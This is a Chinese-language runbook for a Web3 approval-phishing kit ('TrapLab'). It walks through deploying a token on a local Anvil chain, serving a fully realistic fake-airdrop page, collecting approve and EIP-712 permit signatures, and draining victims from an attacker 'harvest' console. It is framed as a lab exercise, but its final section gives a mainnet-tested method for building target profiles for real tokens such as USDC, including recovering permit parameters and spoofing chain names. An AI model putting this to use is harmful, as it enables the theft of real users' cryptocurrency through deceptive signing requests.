# Web3 授权钓鱼复现 Runbook(TrapLab 案例二,Issue #59)

> ⚠ 仅限**自有内网实验室**演练:Anvil 测试链 + 公开测试私钥,零真实资产。
> 受害者页面 100% 拟真、不含任何演示字样;安全边界由本文件与 `/admin` 横幅承载。

角色:受害者 = Anvil 测试账户 #0(导入 MetaMask);攻击者 = 账户 #1(见 config)。

## 1. 起链、部署假币、配置

```bash
anvil --chain-id 31337 --port 8546 &
export PATH="$HOME/.foundry/bin:$PATH"
cd scripts/contracts
forge create PhishingToken --broadcast \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
  --rpc-url http://127.0.0.1:8546
# 记下 Deployed to: 0x… 
cp config.example.yaml config.yaml    # 已 gitignore;把 token.address 改成上面的地址
```

想演示"精确授权有上限"的对比,把 `site.claim_mode` 改成 `exact`。

## 2. 启动钓鱼实验室

```bash
uv run python scripts/phish_server.py --config scripts/config.yaml
```

两个入口:
- **受害者**:`http://<内网IP或localhost>:8088/` —— 逼真假空投站
- **攻击者**:`http://localhost:8088/admin?key=traplab` —— 收割台(口令见 config)

> 服务默认监听 `0.0.0.0`(见 config 的 `server.bind`),仅限**自有可信内网**演示:
> 不要接入含真实资产或敏感数据的设备/网络,严禁端口映射到公网。

## 3. 受害者侧(MetaMask)

1. MetaMask 导入测试私钥 `0xac09…ff80`,网络指到钓鱼站添加的 `NovaChain Mainnet`(即本机 Anvil);
2. 打开钓鱼站 → 连接钱包 → 点「立即领取」→ MetaMask 确认(Approve);
   或点「免 Gas 领取」→ MetaMask 签名(EIP-712,无交易);
3. 页面显示"核销成功,10 分钟内到账"——然后什么都不会发生,这就是攻击得手后的受害者体验。

## 4. 攻击者侧(收割台)

打开 `/admin`:
- 实时事件流出现"受害者连接钱包 / 已签署授权";
- 待收割清单出现新条目 → 点「收割」;
- 状态变"已收割",事件流打印受害者与攻击者余额变化;MetaMask 里核对代币余额归零。

## 5. 收尾

Ctrl-C 停 phish_server;`kill %1` 停 anvil;`pgrep -x anvil` 确认无残留。
permit 的 nonce 固定 0,同一受害者只能演示一次 permit,重演请重启 anvil 或换测试账户。

## 6. 为新目标代币/链产出档案(targets)

引擎与目标解耦:`scripts/targets/<名>.yaml` 打包 `chain`+`token`+`site` 三段实测值,`config.yaml` 以 `target: <名>` 引用。新增一套目标的流程如下(方法论首次成文于 2026-09 主网实测:USDC 暗号破译与 USDT0 判死均由此法得出,证据档案见 targets/*.yaml 注释):

1. **链三件套**:`rpc`(用 curl POST eth_chainId 验可达,公共 RPC 注意 Cloudflare 拦 urllib——服务端已带浏览器 UA)、`chain_id`(必须整数,写进签名防重放)、`rpc_name`(MetaMask 显示名,拟真可任意)。
2. **代币地址**:Polygonscan/BscScan 等官方浏览器认准蓝勾条目取合约地址。
3. **permit 三暗号**(只有 permit 路线需要;无 permit 代币设 `show_gasless: false` 走 approve):
   - `name`/`permit_version`:调合约 `DOMAIN_SEPARATOR()`,本地用 `keccak256(abi.encode(typeHash, keccak(name), keccak(version), chainId, address))` 对候选名逐一比对;对不上就换候选或用第 4 步直接试证。
   - `permit_order`:一次性密钥真签名(`uv run --with eth_account`),按候选顺序组 types,`eth_call` 调 `permit`——revert 消息(如 "INVALID-PERMIT")直接给真相,全程零 gas。
   - 若 DOMAIN_SEPARATOR 含 salt/缺 chainId 等非标结构(如 USDT0),判定 permit 不可用,老老实实 approve。
4. **落档**:按 `polygon-usdc.yaml` 的注释格式填档并注明实测日期与证据;`config.yaml` 改 `target:` 指向它,启动看日志确认链/代币注入无误。
